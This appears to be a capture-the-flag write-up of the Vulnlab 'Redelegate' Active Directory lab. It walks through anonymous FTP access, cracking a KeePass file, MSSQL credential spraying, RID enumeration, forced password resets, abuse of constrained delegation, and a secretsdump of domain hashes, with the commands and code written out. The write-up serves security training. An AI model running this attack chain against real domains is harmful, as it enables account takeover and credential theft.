# Vulnlab - Redelegate

```bash                      
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
| 10-20-24  12:11AM                  434 CyberAudit.txt
| 10-20-24  04:14AM                 2622 Shared.kdbx
|_10-20-24  12:26AM                  580 TrainingAgenda.txt 
| ftp-syst:                  
|_  SYST: Windows_NT              
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-25 15:33:52Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?                    
464/tcp  open  kpasswd5?                                  
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:                             
```

From the scan we have ports 21, 445 from where we could login as anonymous user and look for files

<img src="https://i.imgur.com/M56siLm.png"/>

FTP shows two text files talking about recent audit findings where unused objects and misconfigured ACLs are still in the domain also there's a potential password format`SeasonYear!`

<img src="https://i.imgur.com/qAURM0h.png"/>

So this is giving us a hint on creating a wordlist of seasons for the year 2024, we can simply create that 

```
Spring2024!
Summer2024!
Fall2024!
Autumn2024!
Winter2024!
```

Now one thing to note is whenever we are transferring files from FTP, it is recommended to use binary mode instead of ascii, reason being when transferring from windows to linux, it will convert the line endings accordingly (as they are different in both OS how to they add line feed), with binary it will transfer the file as it is

<img src="https://i.imgur.com/enKoqTp.png"/>

Here this keepass file was downloaded with ascii mode and probably is the reason why it didn't get cracked, changing mode to binary with `binary`

<img src="https://i.imgur.com/1uzlaQe.png"/>

<img src="https://i.imgur.com/sk93K9L.png"/>

The last part of hash can be seen being different in both of the modes

```
ca4e19 - ascii
 
ca   - binary
```

Moving on to accessing this file with `kpcli` , kdbx file can be access with `open` followed by the password we have

<img src="https://i.imgur.com/LxxMXAD.png"/>

With `show -f` we can reveal the passwords

<img src="https://i.imgur.com/P3h7RG3.png"/>

We have six credentials that we can spray and see which one is valid, spraying on smb didn't worked, trying it on mssql

<img src="https://i.imgur.com/KrTFwOD.png"/>

```bash
impacket-mssqlclient SQLGuest@10.10.82.7
```

<img src="https://i.imgur.com/ldQsJOX.png"/>

Trying to use xp_cmdshell to execute commands we can see this user doesn't have privileges to do that 

<img src="https://i.imgur.com/SA51qId.png"/>

Trying to coerce authentication with xp_dirtree in order to can get NTLMv2 challenge/response hash of the user with which the mssql service is running

<img src="https://i.imgur.com/pYcb8gq.png"/>

Which didn't worked

<img src="https://i.imgur.com/GsmfE6c.png"/>

From here we can't do much since NTLMv2 cannot be cracked and we cannot execute any meaning ful stored procedures which can either help us in enumerating the file system or executing any commands but luckily there's a function named  `SUSER_SID` that returns the `Security Identifier` (SID) for  the specified user.

```bash
select sys.fn_varbintohexstr(SUSER_SID('redelegate\Administrator'))
```

<img src="https://i.imgur.com/GsGRuLf.png"/>


This SID is in hex, we can covert this into a proper SID format by using the script mentioned in the article https://keramas.github.io/2020/03/22/mssql-ad-enumeration.html

```python
import struct
import sys
def prepare_sid(sid):
    hex_string = bytes.fromhex(sid[2:])
    mod_sid = sid_to_str(hex_string)
    domain_sid_data = mod_sid.split('-')[:7]
    domain_sid = '-'.join(domain_sid_data) + "-"

    print(domain_sid+"\n")
    return domain_sid

#Build out the SID string
def sid_to_str(sid):
    if sys.version_info.major < 3:
        revision = ord(sid[0])
    else:
        revision = sid[0]

    if sys.version_info.major < 3:
        number_of_sub_ids = ord(sid[1])
    else:
        number_of_sub_ids = sid[1]
    iav = struct.unpack('>Q', b'\x00\x00' + sid[2:8])[0]
    sub_ids = [struct.unpack('<I', sid[8 + 4 * i:12 + 4 * i])[0]
               for i in range(number_of_sub_ids)]

    return 'S-{0}-{1}-{2}'.format(revision, iav, '-'.join([str(sub_id) for sub_id in sub_ids]))

prepare_sid("0x010500000000000515000000a185deefb22433798d8e847af4010000")
```

This will return the domain SID in proper which we can use to append administrator's SID to verify if we can enumerate users like this 

<img src="https://i.imgur.com/RIjq8yU.png"/>

Now we need to iterate over the user SID part

```bash
select (SUSER_SNAME(SID_BINARY(N'S-1-5-21-4024337825-2033394866-2055507597-500')))
```

We can use a for loop to increment the user id, have those queries in a text file and pass it to mssqclient with `-file` parameter

```python
for i in range(500, 10000 + 1, 1):
    print(f"select (SUSER_SNAME(SID_BINARY(N'S-1-5-21-4024337825-2033394866-2055507597-{i}')))")
```

<img src="https://i.imgur.com/vGmXpUx.png"/>

After some time we'll be seeing few domain users, we can utilize them to either check for as-rep roast or spray the password wordlist we have which will lead us to ``

<img src="https://i.imgur.com/YmtFlvf.png"/>

Running bloodhound to enumerate the domain using `python-bloodhounud`

```bash
bloodhound-python -d redelegate.vl -u 'Marie.Curie' -p 'password'  -c all -ns 10.10.92.151
```

<img src="https://i.imgur.com/OAikRSO.png"/>

Through `Marie.Curie` we can change password of `Helen.Frost` with `ForceChangePassword`, since this user is part of helpdesk group and then can logon to DC

<img src="https://i.imgur.com/ZtyZwRW.png"/>

Password can be changed with either `net rpc` or `rpcclient`

```bash
net rpc password "Helen.Frost" -U "redelegate.vl"/"Marie.Curie" -S 10.10.92.151
```

<img src="https://i.imgur.com/Bbmm15I.png"/>

Having the password changed, we can login through `evil-winrm`

<img src="https://i.imgur.com/lokbeev.png"/>

Checking the privileges we have `SeEnableDelegationPrivilege` privilege 

<img src="https://i.imgur.com/lCAmbqU.png"/>

With this privilege, we can configure the delegation attributes are set on the service resulting in either unconstrained or constrained delegation, for this to work we need ability to add an machine account or have control over one, in this case we have machine quota set to 0

<img src="https://i.imgur.com/CiVlWKb.png"/>

But we have `GenericAll` on `FS01$` through which can reset the password and gain control over this account

<img src="https://i.imgur.com/xJ5WPnJ.png"/>

```
net rpc password "FS01$" -U "redelegate.vl"/"Helen.Frost" -S 10.10.92.151
```

<img src="https://i.imgur.com/BLGa7r9.png"/>

Now to configure constrained delegation, we need to set two attributes, the first `TRUSTED_TO_AUTH_FOR_DELEGATION` which is for enabling delegation, then `msDS-AllowedToDelegateTo`  which is for specifying for which service and host it can delegate to

```powershell
Set-ADComputer -Identity FS01 -Add @{'msDS-AllowedToDelegateTo'=@('cifs/dc.redelegate.vl')}

 Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
```

This can be then verified if the properties are set on the machine account, we can look for computers with constrained delegation configure with 

```powershell
Get-ADComputer -Filter * -Properties msDS-AllowedToDelegateTo | Where-Object { $_.'msDS-AllowedToDelegateTo' -ne $null } | Select-Object Name, msDS-AllowedToDelegateTo
```

<img src="https://i.imgur.com/FmUmxad.png"/>

This can also be done with `impacket-findDelegation`

<img src="https://i.imgur.com/qBZ7UFS.png"/>

Impersonating as administrator didn't work as it had `CannotBeDelegate` set to True

<img src="https://i.imgur.com/7fvDXtQ.png"/>

<img src="https://i.imgur.com/sMzcJzs.png"/>

There's another domain admin, `RYAN.COOPER` which we can impersonate

<img src="https://i.imgur.com/e631TjQ.png"/>

With this ticket can gain remote access through ps/wmi/smb exec or dump hash to logon as domain admin

```bash
impacket-secretsdump redelegate.vl/ryan.cooper@dc.redelegate.vl -k -no-pass
```

<img src="https://i.imgur.com/A64sKXl.png"/>


# References


- https://serverfault.com/questions/18619/on-what-basis-should-you-select-acsii-or-binary-transfers-over-ftp
- https://keramas.github.io/2020/03/22/mssql-ad-enumeration.html
- https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/
